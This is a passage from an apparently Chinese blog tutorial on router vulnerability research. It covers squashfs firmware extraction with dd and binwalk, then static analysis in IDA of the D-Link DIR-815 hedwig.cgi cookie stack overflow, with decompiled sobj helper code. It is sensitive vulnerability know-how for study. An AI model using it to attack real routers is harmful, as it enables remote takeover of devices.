class="variable">$strings_output</span>&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;\e[31m[-] \e[0mNULL&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\e[34m[*] \e[0mgrep hsqt&quot;</span></span><br><span class="line">strings_output=$(strings <span class="variable">$filename</span> | grep <span class="string">&#x27;hsqt&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> [ -n <span class="string">&quot;<span class="variable">$strings_output</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;\e[32m[+] \e[0m<span class="variable">$strings_output</span>&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;\e[31m[-] \e[0mNULL&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\e[34m[*] \e[0mgrep tqsh&quot;</span></span><br><span class="line">strings_output=$(strings <span class="variable">$filename</span> | grep <span class="string">&#x27;tqsh&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> [ -n <span class="string">&quot;<span class="variable">$strings_output</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;\e[32m[+] \e[0m<span class="variable">$strings_output</span>&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;\e[31m[-] \e[0mNULL&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\e[34m[*] \e[0mgrep sqlz&quot;</span></span><br><span class="line">strings_output=$(strings <span class="variable">$filename</span> | grep <span class="string">&#x27;sqlz&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> [ -n <span class="string">&quot;<span class="variable">$strings_output</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;\e[32m[+] \e[0m<span class="variable">$strings_output</span>&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;\e[31m[-] \e[0mNULL&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\e[34m[*] \e[0mgrep zlqs&quot;</span></span><br><span class="line">strings_output=$(strings <span class="variable">$filename</span> | grep <span class="string">&#x27;zlqs&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> [ -n <span class="string">&quot;<span class="variable">$strings_output</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;\e[32m[+] \e[0m<span class="variable">$strings_output</span>&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;\e[31m[-] \e[0mNULL&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/image-20240425180158894-1714039430299-1.png" alt="image-20240425180158894"></p>
<p>通过该命令我们找到了squashfs文件系统的magic签名头 <code>hsqs</code>，此时还需要进一步确定是否为 squashfs 文件系统</p>
</li>
<li><p>确定文件系统</p>
<p>通过如下命令来确认是否包含 <code>squashfs</code> 文件系统</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexdump -C firmware.bin|grep -n <span class="string">&#x27;hsqs&#x27;</span> <span class="comment"># hex 窗口打开文件，找到 hsqs 的位置</span></span><br><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=firmware.bin bs=1 count=100 skip=offset of=squash <span class="comment"># 从获得的偏移处(转换成十进制的offset)获取100字节的数据，生成squash文件，因为squashfs文件系统的头部校验不超过100字节</span></span><br><span class="line">file squash <span class="comment"># 使用 file 命令来确认是否是 squashfs 文件系统</span></span><br></pre></td></tr></table></figure>
<p><img src="/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/image-20240425180941481.png" alt="image-20240425180941481"></p>
</li>
<li><p>手动提取文件系统</p>
<p>由于之前的分析，我们知道了 firmware.bin 在偏移 <code>0x00160090</code> 处包含 squashfs 文件系统，其大小为 6164554 字节，小端序，采用 lzma 压缩算法，我们使用 dd 指令将整个数据块 dump 下来</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=firmware.bin bs=1 count=6164554 skip=1441936 of=kernel.squash</span><br></pre></td></tr></table></figure>
<p><img src="/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/image-20240425181737117.png" alt="image-20240425181737117"></p>
<p>此时文件系统的数据已经成功提取出来，我们需要还原 squashfs 文件系统中的根文件系统，由之前的分析，我们知道该文件使用 LZMA 算法进行压缩的，我们可以用 firmware-mod-kit 工具进行解压缩，squashfs-tools 也是一个解压缩工具，但只支持 <code>GIZP,LZO,XZ</code> 格式</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install squashfs-tools</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/rampageX/firmware-mod-kit.git</span><br><span class="line">sudo apt-get install git build-essential zlib1g-dev liblzma-dev python3-magic autoconf python-is-python3</span><br><span class="line"><span class="built_in">cd</span> firmware-mod-kit</span><br><span class="line">./unsquash_all.sh kernel.squash</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="自动提取"><a href="#自动提取" class="headerlink" title="自动提取"></a>自动提取</h2><p>用 Binwalk 进行自动提取文件系统，此外 Binwalk 还能协助进行固件分析和逆向工程等。</p>
<p>binwalk使用的配置文件、magic签名文件及插件位于Python安装目录的<code>/dist-packages/binwalk/</code>目录下</p>
<ol>
<li><p>Binwalk 和 libmagic</p>
<p>Binwalk 使用 libmagic 动态库来实现文件扫描，直接扫描文件的内存镜像，效率更高。</p>
</li>
<li><p>算法流程</p>
<p><img src="/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/image-20240425185606389.png" alt="image-20240425185606389"></p>
</li>
<li><p>提取与分析流程</p>
<p>binwalk 常用命令如下：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 自动扫描</span></span><br><span class="line">binwalk firmware.bin</span><br><span class="line"><span class="comment"># 显示完整的扫描结果</span></span><br><span class="line">binwalk -I firmware.bin</span><br><span class="line"><span class="comment"># 按照预定义配置文件提取 --extrace</span></span><br><span class="line">binwalk -e firmware.bin</span><br><span class="line"><span class="comment"># 根据magic签名结果递归提取 --matryoshka</span></span><br><span class="line">binwalk -Me firmware.bin</span><br><span class="line"><span class="comment"># 限制递归深度 --depth=&lt;int&gt;</span></span><br><span class="line">binwalk -Me -d 5 firmware.bin</span><br><span class="line"><span class="comment"># 扫描指定文件钟通用 CPU 架构的可执行代码 --opcodes</span></span><br><span class="line">binwalk -A 70|more</span><br><span class="line"><span class="comment"># 指定自定义magic签名文件</span></span><br><span class="line">--magic</span><br><span class="line"><span class="comment"># 文件比较</span></span><br><span class="line">binwalk -W firmware1.bin firmware2.bin firmware3.bin</span><br><span class="line"><span class="comment"># 通过墒值判断数据是压缩还是加密</span></span><br><span class="line">binwalk -H firmware.bin</span><br></pre></td></tr></table></figure>
<p><img src="/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/image-20240425190521242.png" alt="image-20240425190521242"></p>
<p><img src="/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/image-20240425190530706.png" alt="image-20240425190530706"></p>
</li>
</ol>
<h1 id="漏洞分析简介"><a href="#漏洞分析简介" class="headerlink" title="漏洞分析简介"></a>漏洞分析简介</h1><p>漏洞公布网站获取信息，<a target="_blank" rel="noopener" href="https://www.exploit-db.com/">Exploit Database(exploit-db.com)</a>，一把会提供漏洞厂商，影响版本，漏洞描述，漏洞发现时间，漏洞公布时间，漏洞状态，漏洞POC（一段可以重现漏洞的代码，Proof of Concept）等信息。</p>
<h1 id="D-Link-DIR-815-路由器多次溢出漏洞分析"><a href="#D-Link-DIR-815-路由器多次溢出漏洞分析" class="headerlink" title="D-Link DIR-815 路由器多次溢出漏洞分析"></a>D-Link DIR-815 路由器多次溢出漏洞分析</h1><h2 id="固件提取"><a href="#固件提取" class="headerlink" title="固件提取"></a>固件提取</h2><ol>
<li><p>EXPLOIT-DATABASE：漏洞存在于hedwig.cgi的CGI脚本中，未认证的攻击者通过调用这个CGI脚本传递一个超长的Cookie值使程序栈溢出，从而获得路由器远程控制权限。</p>
<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/33863">D-Link Devices - ‘hedwig.cgi’ Remote Buffer Overflow in Cookie Header (Metasploit) - Hardware remote Exploit (exploit-db.com)</a></p>
</li>
<li><p>固件下载：<a target="_blank" rel="noopener" href="https://pmdap.dlink.com.tw/PMD/GetAgileFile?itemNumber=FIR1000487&amp;fileName=DIR-815A1_FW101SSB03.bin&amp;fileSize=3784844.0;">DIR-815A1_FW101SSB03</a></p>
</li>
<li><p>提取固件：<code>binwalk -Me DIR-815A1.bin</code></p>
<p>但是遇到warning</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WARNING: Extractor.execute failed to run external extractor <span class="string">&#x27;sasquatch -p 1 -le -d &#x27;</span>squashfs-root<span class="string">&#x27; &#x27;</span>%e<span class="string">&#x27;&#x27;</span>: [Errno 2] No such file or directory: <span class="string">&#x27;sasquatch&#x27;</span>, <span class="string">&#x27;sasquatch -p 1 -le -d &#x27;</span>squashfs-root<span class="string">&#x27; &#x27;</span>%e<span class="string">&#x27;&#x27;</span> might not be installed correctly</span><br></pre></td></tr></table></figure>
<p>参考:</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/yalecaltech/article/details/104244818">binwalk提取时报错’sasquatch‘相关</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46047387/article/details/130016236">关于编译sasquatch时出现<code>‘if’ clause does not guard</code>的解决方案</a></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install zlib1g-dev liblzma-dev liblzo2-dev</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/devttys0/sasquatch.git</span><br><span class="line"><span class="built_in">cd</span> sasquatch</span><br><span class="line">wget https://github.com/devttys0/sasquatch/pull/47.patch</span><br><span class="line">patch -p1 &lt; 47.patch</span><br><span class="line">sudo ./build.sh</span><br></pre></td></tr></table></figure>
<p>此时再执行 <code>binwalk -Me firmware.bin</code> 即可提取完整固件</p>
</li>
<li><p>寻找目标文件 </p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ep@ep-ubuntu23:~/Desktop/IOTWorkspace/DIR-815FW/_firmware.bin.extracted/squashfs-root$ find -name <span class="string">&quot;hedwig.cgi&quot;</span></span><br><span class="line">./htdocs/web/hedwig.cgi</span><br></pre></td></tr></table></figure>
<p>在解包的时候看到这么一条 <code>WARNING: Symlink points outside of the extraction directory: /home/ep/Desktop/IOTWorkspace/DIR-815FW/_firmware.bin.extracted/squashfs-root/htdocs/web/hedwig.cgi -&gt; /htdocs/cgibin; changing link target to /dev/null for security purposes.</code></p>
<blockquote>
<p>没绷住，应该时因为Ubuntu 23 太新了引入了一些安全机制，用回 Ubuntu18.04 就不会有这个问题，这个问题还会影响到后面的动态调试，因此还是重新配一个吧。。。</p>
</blockquote>
<p>可以看出 <code>hedwig.cgi</code> 是指向 <code>cgibin</code> 的链接文件，我们找到 <code>cgibin</code> 文件并分析</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ep@ep-ubuntu23:~/Desktop/IOTWorkspace/DIR-815FW/_firmware.bin.extracted/squashfs-root/htdocs$ file cgibin</span><br><span class="line">cgibin: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped</span><br></pre></td></tr></table></figure>
</li>
<li><p>静态分析目标文件</p>
<p>由 exploit database 提供的信息，漏洞的原因是 cookie 过长导致栈溢出。</p>
<p>我们用 ida 分析该文件，先查找 cookie 有关的字符串，果然找到了 <code>HTTP_COOKIE</code>，交叉引用一下找到了 <code>sess_get_uid</code> 函数的 <code>getenv</code> 调用了这个字符串。</p>
<p><img src="/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/image-20240428164643823.png" alt="image-20240428164643823"></p>
<p>搜一下 <code>getenv</code> 的函数声明：搜索 name 所指向的环境字符串，并返回相关的值给字符串</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">getenv</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *name)</span></span><br></pre></td></tr></table></figure>
<p>也就是通过这个函数获得了 <code>HTTP_COOKIE</code> 对应的值</p>
<p>sobj是一个结构体，每个长度为 24 字节，也就是 6 个word，我们构造 struct sobj</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> sobj struc  # (<span class="keyword">sizeof</span>=<span class="number">0x18</span>, mappedto_20)</span><br><span class="line"><span class="number">00000000</span> field_0:.word ?                          <span class="meta"># offset</span></span><br><span class="line"><span class="number">00000004</span> field_4:.word ?                          <span class="meta"># offset</span></span><br><span class="line"><span class="number">00000008</span> field_8:.word ?</span><br><span class="line"><span class="number">0000000</span>C max_size:.word ?</span><br><span class="line"><span class="number">00000010</span> used_size:.word ?</span><br><span class="line"><span class="number">00000014</span> <span class="built_in">string</span>:.word ?                           <span class="meta"># offset</span></span><br><span class="line"><span class="number">00000018</span> sobj ends</span><br></pre></td></tr></table></figure>
<p>然后恢复各个 sobj 函数，或者直接查看<a target="_blank" rel="noopener" href="https://github.com/patrick-ken/MyNet_N900/blob/master/elbox_WRGND15/comlib/strobj.c">源码</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">sobj *<span class="title function_">sobj_new</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  sobj *result; <span class="comment">// $v0</span></span><br><span class="line"></span><br><span class="line">  result = (sobj *)<span class="built_in">malloc</span>(<span class="number">24u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    result-&gt;field_8 = <span class="number">0</span>;</span><br><span class="line">    result-&gt;max_size = <span class="number">0</span>;</span><br><span class="line">    result-&gt;used_size = <span class="number">0</span>;</span><br><span class="line">    result-&gt;<span class="built_in">string</span> = <span class="number">0</span>;</span><br><span class="line">    result-&gt;field_4 = (<span class="type">char</span> *)result;</span><br><span class="line">    result-&gt;field_0 = (<span class="type">char</span> *)result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sobj_free</span><span class="params">(sobj *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">char</span> *<span class="built_in">string</span>; <span class="comment">// $a0</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">string</span> = a1-&gt;<span class="built_in">string</span>;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">string</span> )</span><br><span class="line">      <span class="built_in">free</span>(<span class="built_in">string</span>);</span><br><span class="line">    a1-&gt;field_8 = <span class="number">0</span>;</span><br><span class="line">    a1-&gt;<span class="built_in">string</span> = <span class="number">0</span>;</span><br><span class="line">    a1-&gt;max_size = <span class="number">0</span>;</span><br><span class="line">    a1-&gt;used_size = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sobj_add_char</span><span class="params">(sobj *a1, <span class="type">char</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> used_size; <span class="comment">// $v1</span></span><br><span class="line">  <span class="type">char</span> *<span class="built_in">string</span>; <span class="comment">// $v0</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !a1 || a1-&gt;max_size == a1-&gt;used_size &amp;&amp; sobj_resize(a1) &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  used_size = a1-&gt;used_size;</span><br><span class="line">  a1-&gt;<span class="built_in">string</span>[used_size] = a2;</span><br><span class="line">  <span class="built_in">string</span> = a1-&gt;<span class="built_in">string</span>;</span><br><span class="line">  a1-&gt;used_size = used_size + <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">string</span>[used_size + <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sobj_strcmp</span><span class="params">(<span class="type">int</span> a1, <span class="type">const</span> <span class="type">char</span> *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v3; <span class="comment">// $a0</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !a1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  v3 = *(<span class="type">const</span> <span class="type">char</span> **)(a1 + <span class="number">20</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    v3 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strcmp</span>(v3, a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *__fastcall <span class="title function_">sobj_get_string</span><span class="params">(sobj *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *<span class="built_in">string</span>; <span class="comment">// $v1</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">string</span> = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">string</span> = a1-&gt;<span class="built_in">string</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">string</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sobj_add_string</span><span class="params">(sobj *a1, <span class="type">const</span> <span class="type">char</span> *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// $v1</span></span><br><span class="line">  <span class="type">size_t</span> v5; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> used_size; <span class="comment">// $v1</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !a1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="built_in">strlen</span>(a2);</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        used_size = a1-&gt;used_size;</span><br><span class="line">        <span class="keyword">if</span> ( a1-&gt;max_size - used_size &gt;= v5 )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        v6 = sobj_resize(a1);</span><br><span class="line">        v4 = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v6 &lt; <span class="number">0</span> )</span><br><span class="line">          <span class="keyword">return</span> v4;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">strcpy</span>(&amp;a1-&gt;<span class="built_in">string</span>[used_size], a2);</span><br><span class="line">      v4 = <span class="number">0</span>;</span><br><span class="line">      a1-&gt;used_size += v5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">sobj_del</span><span class="params">(sobj *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *<span class="built_in">string</span>; <span class="comment">// $a0</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">string</span> = a1-&gt;<span class="built_in">string</span>;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">string</span> )</span><br><span class="line">      <span class="built_in">free</span>(<span class="built_in">string</span>);</span><br><span class="line">    <span class="built_in">free</span>(a1);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">sess_get_uid</span><span class="params">(sobj *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  sobj *v2; <span class="comment">// $s2</span></span><br><span class="line">  <span class="type">char</span> *cookie; <span class="comment">// $v0</span></span><br><span class="line">  sobj *v4; <span class="comment">// $s3</span></span><br><span class="line">  <span class="type">char</span> *cookie_cp; <span class="comment">// $s4</span></span><br><span class="line">  <span class="type">int</span> opt; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">int</span> ch; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">char</span> *<span class="built_in">string</span>; <span class="comment">// $v0</span></span><br><span class="line"></span><br><span class="line">  v2 = sobj_new();</span><br><span class="line">  v4 = sobj_new();</span><br><span class="line">  cookie = 